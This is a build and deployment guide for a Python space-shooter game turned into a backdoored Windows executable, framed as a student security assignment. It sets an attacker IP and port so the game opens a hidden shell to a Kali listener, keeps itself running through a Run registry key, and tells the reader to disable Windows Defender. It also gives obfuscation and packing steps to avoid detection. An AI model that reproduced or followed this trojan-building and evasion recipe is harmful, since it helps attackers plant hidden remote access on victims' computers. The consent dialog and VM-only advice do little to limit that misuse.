# Windows .exe Build Guide

## Overview

This guide explains how to create a Windows executable (.exe) from the Python game so Windows users can run it without installing Python.

---

## Method 1: Automated Build (Recommended)

### On Your Linux Machine (or Windows with Python)

1. **Run the build script:**
```bash
python3 build_windows_exe.py
```

This will:
- Install PyInstaller if needed
- Bundle all game files and dependencies
- Create a single .exe file
- Output to `dist/AlienInvasion.exe`

2. **Transfer to Windows target:**
```bash
# The .exe will be in the dist/ folder
# Copy it to a USB drive or network share
```

---

## Method 2: Manual Build with PyInstaller

### Step 1: Install PyInstaller

```bash
pip install pyinstaller
```

### Step 2: Build the executable

**Simple one-liner:**
```bash
pyinstaller --onefile --windowed --name=AlienInvasion --add-data="images:images" alien_invasion.py
```

**Or use the spec file for more control:**
```bash
pyinstaller build_windows_simple.spec
```

### Step 3: Find your executable

The .exe will be in: `dist/AlienInvasion.exe`

---

## Method 3: Cross-Compile from Linux (Advanced)

You can build Windows .exe from Linux using Wine + PyInstaller:

```bash
# Install Wine
sudo apt install wine wine64

# Install Python in Wine
wine python-installer.exe

# Install PyInstaller in Wine
wine python -m pip install pyinstaller

# Build
wine pyinstaller build_windows_simple.spec
```

---

## Configuration for Kali Linux Listener

### Before Building:

Edit `config.py` and set your Kali Linux IP:

```python
# config.py
LISTENER_HOST = '192.168.1.100'  # Your Kali Linux IP
LISTENER_PORT = 4444
ENABLE_BACKDOOR = True
ENABLE_PERSISTENCE = True
SHOW_CONSENT_DIALOG = True
```

**Important:** The IP address gets embedded in the .exe, so set it before building!

---

## Deployment to Windows Target

### What to Copy:

1. `AlienInvasion.exe` (from dist/ folder)
2. `images/` folder (must be in same directory as .exe)

### Directory Structure on Windows:

```
C:\Users\Target\Downloads\AlienInvasion\
├── AlienInvasion.exe
└── images\
    ├── ship.png
    ├── alien.png
    └── Pasted image.png
```

---

## Testing Setup

### On Kali Linux (Attacker):

1. **Start the listener:**
```bash
cd Space-Shooter
python3 listener.py
```

Expected output:
```
[*] Listener started on 0.0.0.0:4444
[*] Waiting for connection...
```

2. **Check your IP:**
```bash
ip addr show
# or
ifconfig
```

Make sure this matches the IP in config.py!

### On Windows (Target):

1. **Run the game:**
   - Double-click `AlienInvasion.exe`
   - Read and accept the consent dialog
   - Game starts and connects to Kali in background

2. **Verify connection:**
   - On Kali, you should see: `[+] Connection received from...`
   - You now have shell access

---

## Troubleshooting

### Build Issues

**Problem:** PyInstaller not found
```bash
pip install pyinstaller
# or
pip3 install pyinstaller
```

**Problem:** Missing modules
```bash
pip install pygame
```

**Problem:** "Failed to execute script"
- Make sure images folder is present
- Check that all .py files are in the same directory
- Try building with `--debug=all` flag

### Connection Issues

**Problem:** No connection to Kali

**Check:**
1. Firewall on Kali:
```bash
sudo ufw allow 4444
# or disable temporarily
sudo ufw disable
```

2. Network connectivity:
```bash
# On Windows, ping Kali
ping 192.168.1.100
```

3. Listener is running before game starts

4. IP address in config.py is correct

### Windows Defender Issues

**Problem:** Windows Defender blocks the .exe

**Solution:**
1. This is expected (it's a backdoor!)
2. For testing, add exclusion:
   - Windows Security → Virus & threat protection
   - Manage settings → Exclusions
   - Add folder exclusion for game directory

3. Or disable Real-time protection temporarily (testing only!)

---

## Advanced: Obfuscation (Optional)

To make the .exe less detectable:

### 1. Install PyArmor
```bash
pip install pyarmor
```

### 2. Obfuscate the code
```bash
pyarmor obfuscate alien_invasion.py
```

### 3. Build from obfuscated code
```bash
cd dist
pyinstaller --onefile alien_invasion.py
```

### 4. Use UPX compression
```bash
# Install UPX
sudo apt install upx

# Build with UPX
pyinstaller --onefile --upx-dir=/usr/bin alien_invasion.py
```

---

## File Size Optimization

The .exe might be large (50-100MB). To reduce:

1. **Use --onefile instead of --onedir**
   - Already done in our build script

2. **Exclude unnecessary modules:**
```bash
pyinstaller --onefile --exclude-module matplotlib --exclude-module numpy alien_invasion.py
```

3. **Use UPX compression:**
```bash
pyinstaller --onefile --upx-dir=/usr/bin alien_invasion.py
```

---

## Security Considerations

### For Your Assignment:

1. **Clearly label this as educational:**
   - The consent dialog does this
   - Documentation emphasizes educational purpose

2. **Only test in VMs:**
   - Never deploy on real systems
   - Use isolated network

3. **Demonstrate responsibly:**
   - Show the cleanup tool
   - Explain detection methods
   - Discuss defense strategies

### For Presentation:

Show that you understand:
- Why Windows Defender flags it (it's a backdoor!)
- How to detect such software (netstat, process monitor)
- How to prevent such attacks (whitelisting, sandboxing)
- Ethical implications of such tools

---

## Quick Reference

### Build Command:
```bash
python3 build_windows_exe.py
```

### Start Listener (Kali):
```bash
python3 listener.py
```

### Run Game (Windows):
```
Double-click AlienInvasion.exe
```

### Cleanup (Windows):
```bash
# If you included cleanup_tool in the build
python cleanup_tool.py

# Or manually:
# 1. Win+R → regedit
# 2. Navigate to: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# 3. Delete "AlienInvasion" entry
```

---

## Presentation Demo Flow

1. **Show Kali Linux:**
   - Terminal with listener running
   - Show IP address

2. **Show Windows VM:**
   - Clean system
   - No Python installed
   - Just the .exe and images folder

3. **Run the game:**
   - Show consent dialog
   - Accept and start game
   - Play briefly to show it works

4. **Switch to Kali:**
   - Show connection received
   - Execute commands (whoami, dir, etc.)
   - Show you have shell access

5. **Back to Windows:**
   - Game still running smoothly
   - No visible indication of backdoor

6. **Restart Windows:**
   - Show game auto-starts
   - Persistence demonstrated

7. **Run cleanup:**
   - Show cleanup tool
   - Verify persistence removed

8. **Explain defenses:**
   - How to detect (netstat, task manager)
   - How to prevent (antivirus, whitelisting)
   - Ethical considerations

---

## Checklist for Presentation

- [ ] .exe built and tested
- [ ] Images folder included
- [ ] Kali Linux IP configured correctly
- [ ] Listener script ready
- [ ] Windows VM prepared
- [ ] Network connectivity verified
- [ ] Firewall rules configured
- [ ] Cleanup tool tested
- [ ] Documentation printed/ready
- [ ] Demo flow practiced
- [ ] Backup plan if network fails

---

## Support

If you encounter issues:

1. Check `DOCUMENTATION.md` for detailed troubleshooting
2. Verify all files are present
3. Test network connectivity
4. Check firewall settings
5. Review error messages carefully

Good luck with your presentation! 🚀
